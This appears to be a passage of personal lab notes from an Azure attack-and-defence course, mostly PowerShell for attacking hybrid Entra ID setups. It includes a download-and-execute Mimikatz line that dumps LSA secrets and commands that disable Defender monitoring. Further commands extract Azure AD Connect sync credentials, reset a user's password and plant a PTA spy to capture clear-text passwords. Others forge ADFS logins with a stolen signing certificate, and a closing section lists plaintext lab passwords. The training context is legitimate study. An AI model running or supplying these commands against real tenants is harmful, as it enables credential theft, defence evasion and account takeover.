    # This script is a part of Attacking and Defending Azure - Beginner's Edition course by Altered Security
# https://www.alteredsecurity.com/azureadlab

$token = (Get-AzAccessToken -ResourceUrl "https://graph.microsoft.com/").Token

if (-not $token) {
    Write-Host "[+] Failed to retrieve access token." -ForegroundColor Red
    exit
} else {
    Write-Host "[+] Access token retrieved successfully." -ForegroundColor Green
}

$applicationsUrl = "https://graph.microsoft.com/beta/applications"

Write-Host "Retrieving applications from Microsoft Graph..." -ForegroundColor Cyan
$applications = Invoke-RestMethod -Uri $applicationsUrl -Headers @{ Authorization = "Bearer $token" }

if (-not $applications) {
	Write-Host "[-] No applications found or failed to retrieve applications." -ForegroundColor Red
    exit
} else {
    Write-Host "[+] Successfully retrieved applications." -ForegroundColor Green
}

foreach ($application in $applications.value) {
    $objectId = $application.id
    $displayName = $application.displayName

    try {
        $proxyUrl = "$applicationsUrl/$objectId/onPremisesPublishing"

        $proxyDetail = Invoke-RestMethod -Uri $proxyUrl -Method Get -Headers @{ Authorization = "Bearer $token" }

        if ($proxyDetail) {
			Write-Host ""
            Write-Host "Application Proxy used by application: '$displayName'" -ForegroundColor White
            Write-Host "External URL: $($proxyDetail.externalUrl)" -ForegroundColor White
            Write-Host "Internal URL: $($proxyDetail.internalUrl)" -ForegroundColor White
            Write-Host "ServicePrincipal ID: $( (Get-MgServicePrincipal -Filter "DisplayName eq '$displayName'" ).id)" -ForegroundColor Cyan
            Write-Host "External Authentication Type: $($proxyDetail.externalAuthenticationType)" -ForegroundColor White
        } else {
        }
    } catch {
    }
}
}

```

- Find users and groups allowed to access the application

```
function Get-MgApplicationProxyAssignedUsersAndGroups{
param(
[string] $ObjectId = "null"
)

$aadapServPrincObjId=$ObjectId

If ($aadapServPrincObjId -eq "null") {

Write-Host "Parameter is missing." -BackgroundColor "Black" -ForegroundColor "Green"
    Write-Host " "
    Write-Host "Get-MgApplicationProxyAssignedUsersAndGroups -ObjectId <ObjectId of the application>" -BackgroundColor "Black" -ForegroundColor "Green"
    Write-Host " "
    return
}


Write-Host "Reading users. This operation might take longer..." -BackgroundColor "Black" -ForegroundColor "Green"

$users= Get-MgUser -Top 1000000

Write-Host "Reading groups. This operation might take longer..." -BackgroundColor "Black" -ForegroundColor "Green"

$groups = Get-MgGroup -Top 1000000

try {$app = Get-MgServicePrincipal -Filter "Id eq '$aadapServPrincObjId'"}

catch {

Write-Host "Possibly the ObjetId is incorrect." -BackgroundColor "Black" -ForegroundColor "Red"
    Write-Host " "

}

Write-Host ("Application: " + $app.DisplayName + "(ServicePrinc. ObjID:" + $aadapServPrincObjId + ")")
Write-Host ("")
Write-Host ("Assigned (directly and through group membership) users:")
Write-Host ("")

$number=0

foreach ($item in $users) {

$listOfAssignments = Get-MgUserAppRoleAssignment -UserId $item.Id

$assigned = $false

foreach ($item2 in $listOfAssignments) { if ($item2.ResourceId -eq $aadapServPrincObjId) { $assigned = $true } }

If ($assigned -eq $true) {
        Write-Host ("DisplayName: " + $item.DisplayName + " UPN: " + $item.UserPrincipalName + " ObjectID: " + $item.Id)
        $number = $number + 1
     }
}

Write-Host ("")
Write-Host ("Number of (directly and through group membership) users: " + $number)
Write-Host ("")
Write-Host ("")
Write-Host ("Assigned groups:")
Write-Host ("")

$number=0

foreach ($item in $groups) {

$listOfAssignments = Get-MgGroupAppRoleAssignment -GroupId $item.Id

$assigned = $false

foreach ($item2 in $listOfAssignments) { If ($item2.ResourceID -eq $aadapServPrincObjId) { $assigned = $true } }

If ($assigned -eq $true) {
        Write-Host ("DisplayName: " + $item.DisplayName + " ObjectID: " + $item.Id)
        $number=$number+1
   }
}

Write-Host ("")
Write-Host ("Number of assigned groups: " + $number)
Write-Host ("")

Write-Host ("")
Write-Host ("Finished.") -BackgroundColor "Black" -ForegroundColor "Green"
Write-Host ("") 
Write-Host "To disconnect from Microsoft Graph, please use the Disconnect-MgGraph cmdlet."
}
```
`Get-MgApplicationProxyAssignedUsersAndGroups -ObjectId ec350d24-e4e4-4033-ad3f-bf60395f0362`

- Mimikatz
```
iex (New-Object Net.Webclient).downloadstring('http://172.16.150.13:82/mimi.ps1'); 
Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
```
- Sync between AD Azure and on prem
Sync uses either **Connect Sync** or **Cloud Sync** 

Azure AD Connect Sync  is a software application installed on a Windows Server in on-premises environment and is best for organizations with complex on-premises environments that need extensive customization and hybrid identity features using different options:
1. Password Hash Sync: Synchronizes password hashes from on-premises AD to Azure AD, enabling users to use the same password for on-premises and cloud resources. **(also supported by Azure AD Cloud Sync)**
2. Pass-through Authentication (PTA): Provides a way for users to sign in to both on-premises and cloud resources using the same credentials, without storing passwords in Azure AD. **(not supported by Azure AD Cloud Sync)**
3. Federation Integration: Supports integration with on-premises Active Directory Federation Services (AD FS) for advanced authentication scenarios.

Azure AD Cloud Sync is a lightweight, cloud-managed synchronization service that synchronizes users and groups to Azure AD without the need for a persistent on-premises sync server; it is ideal for organizations seeking a lightweight, cloud-native solution with minimal maintenance.

- Get the sync methods used 
```
Install-Module -Name "AzureADHybridHealth"
Get-AzureADConnectHealthSyncStatus
```
-  **Connect Sync**: Extract the credentials of MSOL_* and Sync_* which have DC Sync privilege

Check if `Entra connect` is installed using `AzureADConnectHealthSync` Module
```
Get-ADSyncConnector
```
And extract Sync creds remotly 
```
Enter-PSSession $adcnct
Set-MpPreference -DisableRealtimeMonitoring $true
exit

Copy-Item -ToSession $adcnct -Path C:\AzAD\Tools\AADInternals.0.4.5.zip -Destination C:\Users\Administrator\Documents
Enter-PSSession $adcnct
Expand-Archive C:\Users\Administrator\Documents\AADInternals.0.4.5.zip -DestinationPath C:\Users\Administrator\Documents\AADInternals
Import-Module C:\Users\Administrator\Documents\AADInternals\AADInternals.psd1
Get-AADIntSyncCredentials
```
Use the credentials of the Sync_* account to request an access token for AADGraph API and save it to cache:
```
$passwd = ConvertTo-SecureString 'password' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("Sync_DEFENG-ADCNCT_782bef6aa0a9@defcorpsecure.onmicrosoft.com", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds –SaveToCache
```
Get the ImmutableId for the onpremadmin user:
```
$ImmutableId = (Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com).ImmutableId
```
Reset the onpremadmin user's password using the below command:
```
Set-AADIntUserPassword -SourceAnchor $ImmutableId -Password "SuperSecretpass#12321" –Verbose
```

- Abusing PTA Sync method (backdoor PTA agent on a server where  Entra connect is installed)
```
# info
Get-ADSyncConnector

#check if PTA is installed by checking if the PassthroughAuthPSModule is available on the machine (not reliable)
Get-Command -Module PassthroughAuthPSModule
Import-Module C:\Users\adconnectadmin\Documents\AADInternals\AADInternals.psd1
#Install the agent
Install-AADIntPTASpy

# Now, we can authenticate as any user that is synced from on-prem and we can also get passwords in clear-text for the users that authenticate with the correct password:
Get-AADIntPTASpyLog -DecodePasswords
```
Other important accounts is **AZUREADSSOACC**

- Abusing Federation with ADFS Server (requires Domain Admin privilege)
```
#Enumerate ADFS Server
Install-WindowsFeature -Name "RSAT-AD-FS"
Import-Module ADFS
Get-AdfsFarmInformation
Get-AdfsProperties

#Connect to ADFS server
$password = ConvertTo-SecureString 'UserToCreateandManageF3deration!' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('adfsadmin', $password)
$adfs = New-PSSession -ComputerName 172.16.4.41 -Credential $creds
Enter-PSSession $adcnct

#Copy AADInternals tool to the server
Set-MpPreference -DisableRealtimeMonitoring $true
exit

Copy-Item -ToSession $adfs -Path C:\AzAD\Tools\AADInternals.0.4.5.zip -Destination C:\Users\adfsadmin\Documents
Enter-PSSession $adfs
Expand-Archive C:\Users\adfsadmin\Documents\AADInternals.0.4.5.zip -DestinationPath C:\Users\adfsadmin\Documents\AADInternals

#Export the token signing certificate
Export-AADIntADFSSigningCertificate

#Get the ImmutableID of the user that we want to compromise
Import-Module C:\AzAD\Tools\ADModule\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AzAD\Tools\ADModule\ActiveDirectory\ActiveDirectory.psd1

$immutableID = [System.Convert]::ToBase64String((Get-ADUser -Identity onpremuser -Server 172.16.4.1 -Credential $creds | select -ExpandProperty ObjectGUID).tobytearray())

#Use the token signing certificate with the ImmutableID of onpremuser that we want to compromise
Open-AADIntOffice365Portal -ImmutableID $immutableID -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose

#Copy the temporay html to the student VM and open it to login as the onpremuser user
ls C:\Users\adfsadmin\AppData\Local\Temp\*.tmp.html
exit

Copy-Item -FromSession $adfs -Path C:\Users\adfsadmin\AppData\Local\Temp\tmp9E0F.tmp.html -Destination C:\AzAD\Tools\
```
- Temp
```
DavidDHenriques@defcorphq.onmicrosoft.com ; password: IAm@M0b1leUs3r@t0rganization

$username = 'thomasebarlow@defcorpit.onmicrosoft.com' ; $password = 'DeployM3ntUserInTh3Tan3nt!!'

$username = "stevencking@defcorphq.onmicrosoft.com";$password="St0rage@ccountsCanReadSt3v3n!!";

$email = "samcgray@defcorphq.onmicrosoft.com", $passwd =  'Manag3dUserF0rVirtualM@chines'

$email = "adfsadmin@deffin.com" $password = "UserToCreateandManageF3deration!"

```